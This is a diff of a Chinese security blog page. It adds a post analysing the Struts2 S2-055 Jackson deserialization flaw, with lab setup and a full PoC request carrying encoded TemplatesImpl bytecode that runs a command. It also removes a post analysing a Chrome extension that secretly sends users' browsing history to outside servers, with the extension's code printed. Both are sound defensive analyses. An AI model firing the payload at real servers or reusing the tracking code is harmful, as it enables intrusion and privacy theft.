@@ -334,6 +334,188 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/12/06/S2-055漏洞环境搭建与分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/12/06/S2-055漏洞环境搭建与分析/" itemprop="url">
+                  S2-055漏洞环境搭建与分析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-06T22:28:56+08:00">
+                2017-12-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Struts2/" itemprop="url" rel="index">
+                    <span itemprop="name">Struts2</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/12/06/S2-055漏洞环境搭建与分析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/12/06/S2-055漏洞环境搭建与分析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/12/06/S2-055漏洞环境搭建与分析/" class="leancloud_visitors" data-flag-title="S2-055漏洞环境搭建与分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="1-综述"><a href="#1-综述" class="headerlink" title="1 综述"></a>1 综述</h1><p>2017年12月1日，Apache Struts发布最新的安全公告，Apache Struts 2.5.x REST插件存在远程代码执行的中危漏洞，漏洞编号与CVE-2017-7525相关。漏洞的成因是由于使用的Jackson版本过低在进行JSON反序列化的时候没有任何类型过滤导致远程代码执行。当然官方说的影响是未知，其实这里是远程代码执行。<br>相关链接如下：<br><a href="https://cwiki.apache.org/confluence/display/WW/S2-055" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-055</a><br>影响版本：<br> Struts 2.5 - Struts 2.5.14<br>规避方案<br>立即升级到Struts 2.5.14.1或者升级com.fasterxml.jackson到2.9.2版本</p>
+<h1 id="2-技术分析"><a href="#2-技术分析" class="headerlink" title="2 技术分析"></a>2 技术分析</h1><p>从官方的描述来看，这个就是Jackson的反序列化漏洞，由于Jackson在处理反序列的时候需要支持多态，所以在反序列的时候通过指定特定的类来达到实现多态的目的。这个特性默认是不开启的，所以在Struts2中影响也是有限。</p>
+<h2 id="2-1-Jackson多态类型绑定"><a href="#2-1-Jackson多态类型绑定" class="headerlink" title="2.1 Jackson多态类型绑定"></a>2.1 Jackson多态类型绑定</h2><p>为了让Jackson支持多态，Jackson官方提供了几种方式，下面介绍两种常用方式（<a href="https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization）" target="_blank" rel="external">https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization）</a><br>第一种：全局Default Typing机制，启用代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">objectMapper.enableDefaultTyping(); <span class="comment">// default to using DefaultTyping.OBJECT_AND_NON_CONCRETE</span></div><div class="line">objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</div></pre></td></tr></table></figure></p>
+<p>这是一个全局开关，打开之后，在持久化存储数据时会存储准确的类型信息。</p>
+<p>第二种：为相应的class添加@JsonTypeInfo注解<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> ObjectMapper <span class="title">enableDefaultTyping</span><span class="params">(DefaultTyping dti)</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> enableDefaultTyping(dti, JsonTypeInfo.As.WRAPPER_ARRAY);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>通过阅读源码也能发现，全局Default Typing机制也是通过JsonTypeInfo来实现的。下面来看一个简单的示例：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.WRAPPER_ARRAY)</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123; &#125;  在超类Animal上加上一段<span class="meta">@JsonTypeInfo</span>，所有Animal的子类反序列化都可以准确的对于子类型。</div></pre></td></tr></table></figure></p>
+<p>这段注解什么意思呢？JsonTypeInfo.Id.CLASS是指序列化或者反序列时都是全名称，如<code>org.codehaus.jackson.sample.Animal</code>,<code>JsonTypeInfo.As.WRAPPER_ARRAY</code> 意为使用数组表示，如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[</div><div class="line">    &quot;com.fasterxml.beans.EmployeeImpl&quot;,</div><div class="line">    &#123;</div><div class="line">       ... // actual instance data without any metadata properties</div><div class="line">    &#125;</div><div class="line">]</div></pre></td></tr></table></figure></p>
+<h2 id="2-2-S2-055-环境搭建"><a href="#2-2-S2-055-环境搭建" class="headerlink" title="2.2 S2-055 环境搭建"></a>2.2 S2-055 环境搭建</h2><p>了解了Jackson的相关多态的特性之后，为了触发反序列化漏洞，必须开启这个特性，再来看看Struts2的相关代码。由于Jackson不是Struts2 json格式的默认处理句柄，首先修改struts.xml,添加如下代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">type</span>=<span class="string">"org.apache.struts2.rest.handler.ContentTypeHandler"</span> <span class="attr">name</span>=<span class="string">"jackson"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.rest.handler.JacksonLibHandler"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.rest.handlerOverride.json"</span> <span class="attr">value</span>=<span class="string">"jackson"</span>/&gt;</span></div></pre></td></tr></table></figure></p>
+<p>这样Content-Type为application/json格式的请求都交给了JcaksonLibHandler来处理，再来分析下JacksonLibHandler的代码，如下所示：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">toObject</span><span class="params">(Reader in, Object target)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">        mapper.configure(SerializationFeature.WRITE_NULL_MAP_VALUES, <span class="keyword">false</span>);</div><div class="line">        ObjectReader or = mapper.readerForUpdating(target);</div><div class="line">        or.readValue(in);</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>上述代码是处理json反序列的逻辑，很显然没有启用全局Default Typing机制，那么为了触发这个漏洞只能是通过第二种支持多态的方式来打开这个特性。这个漏洞和S2-052非常类似，都是引用的第三方库存在缺陷导致的漏洞，这样的案例数不胜数，在Java生态中简直就是一个灾难，第三方依赖实在太多。为了分析这个漏洞，我们还是拿052的环境来做测试，也就是rest-show-case，环境搭建可以参考<a href="http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/，具体的修改如下：">http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/，具体的修改如下：</a><br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Order</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> String id;</div><div class="line">    <span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.WRAPPER_ARRAY)</div><div class="line">    <span class="keyword">public</span> Object clientName;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">int</span> amount;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Order</span><span class="params">()</span> </span>&#123;&#125;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Order</span><span class="params">(String id, Object clientName, <span class="keyword">int</span> amount)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>();</div><div class="line">        <span class="keyword">this</span>.id = id;</div><div class="line">        <span class="keyword">this</span>.clientName = clientName;</div><div class="line">        <span class="keyword">this</span>.amount = amount;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setClientName</span><span class="params">(Object clientName)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.clientName = clientName;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>修改部分主要在<code>@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.WRAPPER_ARRAY)
+    public Object clientName;</code> 一个在clientName上方添加注解，打开支持多态的特性，这样我们就能指定clientName的类型；另一个是将clientName的类型改为Object类型，这样就避免了类型不匹配或者不是其子类的错误。相应地修改setClientName方法的传入类型为Object。</p>
+<h2 id="2-3-PoC构造"><a href="#2-3-PoC构造" class="headerlink" title="2.3 PoC构造"></a>2.3 PoC构造</h2><p>Jackson已经暴露了很多种PoC在外，下面我们拿com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl来做示例，具体的PoC如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">POST /orders HTTP/1.1</div><div class="line">Host: 192.168.3.103:8080</div><div class="line">Proxy-Connection: keep-alive</div><div class="line">Content-Length: 2157</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://192.168.3.103:8080</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: application/json</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</div><div class="line">Referer: http://192.168.3.103:8080/orders/new</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,zh-TW;q=0.6</div><div class="line">Cookie: csrftoken=LYokAxo4ABMl0wKhLhkdl1x5I0AQQDE8E3L1zcc3A1YVybHMEHkOWq01VqdnfJEm; JSESSIONID=7367044F7C24B8BE7CDE5444E28E2BF4</div><div class="line"></div><div class="line">&#123;&quot;clientName&quot;:[&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&#123;&quot;transletBytecodes&quot;:[&quot;yv66vgAAADEANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA1McGVyc29uL1Rlc3Q7AQAKRXhjZXB0aW9ucwcALAEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAuAQAKU291cmNlRmlsZQEACVRlc3QuamF2YQwACAAJBwAvDAAwADEBAARjYWxjDAAyADMBAAtwZXJzb24vVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAAPAAQAEAANABEADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAEACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAVAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIAAAABABcAGAADAAEAEQAZAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAaAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGgAbAAIADwAAAAQAAQAcAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAAB0ACAAeAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABACIAAQAjAAAAAgAk&quot;],&quot;transletName&quot;:&quot;a.b&quot;,&quot;outputProperties&quot;:&#123;&#125;&#125;]&#125;</div></pre></td></tr></table></figure></p>
+<p>首先将ContentType设置为application/json，这样请求才会丢给Jackson处理。这里最核心的部分就是clientName字段了，必须和前面注解部分绑定，也就是这个字段必须有，很显然，这个漏洞不具有通用性，首先得有一个Object类型的字段，其次这个字段还必须用注解JsonTypeInfo修饰。这种情况应该少之又少。下面给个计算器的图吧。<br><img src="/images/S2-055-cal.png" alt="1"></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+    <! -- 添加微信图标 -->
+    
+      
+    
+    
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/11/23/Java JSON反序列化之殇-看雪安全开发者峰会/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2025,185 +2207,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2016/05/01/小心浏览器插件窃取你的隐私/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="廖新喜">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xxlegend">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/05/01/小心浏览器插件窃取你的隐私/" itemprop="url">
-                  小心浏览器插件窃取你的隐私
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-01T15:38:36+08:00">
-                2016-05-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Burpsuite/" itemprop="url" rel="index">
-                    <span itemprop="name">Burpsuite</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2016/05/01/小心浏览器插件窃取你的隐私/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2016/05/01/小心浏览器插件窃取你的隐私/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2016/05/01/小心浏览器插件窃取你的隐私/" class="leancloud_visitors" data-flag-title="小心浏览器插件窃取你的隐私">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>浏览器插件已经成为了浏览器的必备品，但是市场上的插件也良莠不齐，甚至部分插件切换用户隐私，如浏览器的历史记录。笔者就遇到了这样一个插件，就是著名的手势插件：crxMouse Chrome Gestures，更可气的是已经用了这个插件一年多了。</p>
-<p>#1 简单介绍：<br>用Google搜索crxMouse Chrome Gestures导向到google市场，可以看到这款插件的简单介绍。<br>原名:Gestures for Chrome(TM)汉化版.方便,快捷,充分发掘鼠标的所有操作.功能包括:鼠标手势,超级拖曳,滚轮手势,摇杆手势,平滑滚动,标签页列表等.<br>本扩展致力于通过鼠标来实现一些功能操作,充分挖掘鼠标的所有操作.<br>功能包括:鼠标手势,超级拖曳,滚轮手势,摇杆手势,平滑滚动,标签页列表等<br>目前在google市场上这款插件有30万的用户，累计评价5000，其中很大一部分是国内用户，影响还是非常广泛的。<img src="http://104.251.228.50/pic/crxmouse_google.png" alt="google市场"></p>
-<p>#2 验证窃取行为<br>通过wireshark抓包可以看到两个分别发送到s808.searchelper.com和s1808.searchelper.com的请求，直接上图：<img src="http://104.251.228.50/pic/related.png" alt="s808服务请求"></p>
-<p>  从origin可以看出，请求是来源于浏览器插件，标记为：jgiplclhploodgnkcljjgddajfbmafmp，可以通过chrome的chrome://extensions/找到该id对应的插件，就是<img src="http://104.251.228.50/pic/crxmouse.png" alt="插件显示">，其对应的系统目录为<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\Users\[用户]\AppData\Local\Google\Chrome\User Data\Default\Extensions\jgiplclhploodgnkcljjgddajfbmafmp</div><div class="line">  ```，我们可以通过分析其代码发现其实现，这个后续再讲。细心的读者可能会看到post请求段被加密了，看结构像是base64，尝试用base64解码，还是base64编码格式，再次解码，得到如下数据：</div></pre></td></tr></table></figure></p>
-<p>s=808&amp;md=21&amp;pid=SjOa3PgqWSHYapU&amp;sess=314039255259558500&amp;q=<a href="http://bbs.pediy.com/showthread.php?t=179524&amp;prev=http://bbs.pediy.com/forumdisplay.php?f=161&amp;link=1&amp;sub=chrome&amp;hreferer=http://bbs.pediy.com/forumdisplay.php?f=161&amp;tmv=3015" target="_blank" rel="external">http://bbs.pediy.com/showthread.php?t=179524&amp;prev=http://bbs.pediy.com/forumdisplay.php?f=161&amp;link=1&amp;sub=chrome&amp;hreferer=http://bbs.pediy.com/forumdisplay.php?f=161&amp;tmv=3015</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">s=808就代表着服务器s808,pid即userid，sess是用户本地标记session，sub代表着浏览器类型，q代表当前页面，prev代表着从哪个页面过来，也就是referer的作用，hreferer就也记录着referer字段有了这些数据就可以分析用户行为，可以供搜索引擎，其实百度统计和google统计也是干同样的事，甚至百度统计还有点击等的统计。就这样你的浏览行为被发送给了其他服务器，这不是最危险的，最危险的是你在浏览内网的一些页面也会被发送出去，内网的一些站点就很容易被泄露了。</div><div class="line">  接着我们看另外一个请求，这个请求是发送到s1808服务器上，具体请求如下：![s1808服务器的请求][4]，解密加密后的内容和发送到s808的请求基本一致，具体如下：</div></pre></td></tr></table></figure></p>
-<p>s=1808&amp;md=21&amp;pid=SjOa3PgqWSHYapU&amp;sess=765877789119258500&amp;sub=chrome&amp;q=http%3A//bbs.pediy.com/showthread.php%3Ft%3D179524&amp;hreferer=http%3A//bbs.pediy.com/forumdisplay.php%3Ff%3D161&amp;prev=http%3A//bbs.pediy.com/forumdisplay.php%3Ff%3D161&amp;tmv=4015&amp;tmf=1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">这里就有点搞不太清楚发这样一个备份请求的原因了，难道仅仅是备份，有待思考，为了更好的弄清楚该插件还有没有其他危险行为，接下来我们分析插件的实现。</div><div class="line"></div><div class="line">#3 恶意插件实现</div><div class="line">插件的恶意行为集中在upalytics_ch.js代码中，安装后的初始化代码：</div><div class="line">```js</div><div class="line">this.initOnceAfterInstall = function() &#123;</div><div class="line">    if (!utils.db.get(&quot;userid&quot;)) &#123;</div><div class="line">        var id = utils.createUserID();</div><div class="line">        utils.db.set(&quot;userid&quot;, id)</div><div class="line">    &#125;</div><div class="line">    if (!utils.db.get(&quot;install_time&quot;)) &#123;</div><div class="line">        var now = (new Date).getTime() / 1E3;</div><div class="line">        utils.db.set(&quot;install_time&quot;, now)</div><div class="line">    &#125;</div><div class="line">    if (!utils.db_type.get(&quot;tmv&quot;)) &#123;</div><div class="line">        var now = (new Date).getTime() / 1E3;</div><div class="line">        utils.db_type.set(&quot;tmv&quot;, SIM_ModuleConstants._TMV);</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
-<p>在初始化中生成userid，获取install_time，twv字段存放在本地localstorage中，接着会创建各种调用addListener接口来创建监听器，当tab页更新，替换，激活的时候就会调用相应的请求发送相应的函数，extension_onRequest则是发送到s808服务器，tabs_onUpdated,tabs_onActivated,tabs_onReplaced则是发送请求到s1808服务器，具体代码如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.start = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        chrome.extension.onRequest.addListener(extension_onRequest);</div><div class="line">        chrome.tabs.onUpdated.addListener(tabs_onUpdated);</div><div class="line">        chrome.tabs.onActivated.addListener(tabs_onActivated);</div><div class="line">        chrome.tabs.onReplaced.addListener(tabs_onReplaced)</div><div class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">        log.SEVERE(<span class="string">"8835"</span>, e)</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>下面我们简单分析下发送到s808.searchelper.com的related请求的代码，已简化，简化部分主要是去除一些google搜索的跳转，去除docType非html类型的，去除间隔时间很短的。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">extension_onRequest</span>(<span class="params">request, sender, sendResponse</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> prev_state = tabs_states[tabId];</div><div class="line">    tabs_states[tabId] = change_status;</div><div class="line">    <span class="keyword">if</span> (res_prev_url == tab_url &amp;&amp; prev_state != change_status)&#123;</div><div class="line">	    log.ERROR(<span class="string">"ERROR 8002 ??"</span>);</div><div class="line">	    <span class="keyword">return</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(res_prev_url == <span class="literal">null</span> || res_prev_url.length == <span class="number">0</span>) &#123;</div><div class="line">	    res_prev_url = last_prev;</div><div class="line">    &#125;</div><div class="line">    last_prev = tab_url;</div><div class="line">    <span class="keyword">var</span> data = <span class="string">"s="</span> + SIM_Config_BG.getSourceId() + <span class="string">"&amp;md=21&amp;pid="</span> + utils.db.get(<span class="string">"userid"</span>) + <span class="string">"&amp;sess="</span> + SIM_Session.getSessionId() + <span class="string">"&amp;q="</span> + <span class="built_in">encodeURIComponent</span>(tab_url) + <span class="string">"&amp;prev="</span> + <span class="built_in">encodeURIComponent</span>(res_prev_url) + <span class="string">"&amp;link="</span> + (ref ? <span class="string">"1"</span> : <span class="string">"0"</span>) + <span class="string">"&amp;sub="</span> + SIM_ModuleConstants.BROWSER + <span class="string">"&amp;hreferer="</span> + <span class="built_in">encodeURIComponent</span>(ref);</div><div class="line">    data = data + <span class="string">"&amp;tmv="</span> + SIM_ModuleConstants._TMV;</div><div class="line">    data = SIM_Base64.encode(SIM_Base64.encode(data));</div><div class="line">    data = <span class="string">"e="</span> + data;</div><div class="line">    <span class="keyword">var</span> url = utils.db_type.get(<span class="string">"server"</span>) + <span class="string">"/related"</span>;</div><div class="line"></div><div class="line">    utils.net.post(url, <span class="string">"json"</span>, data, <span class="function"><span 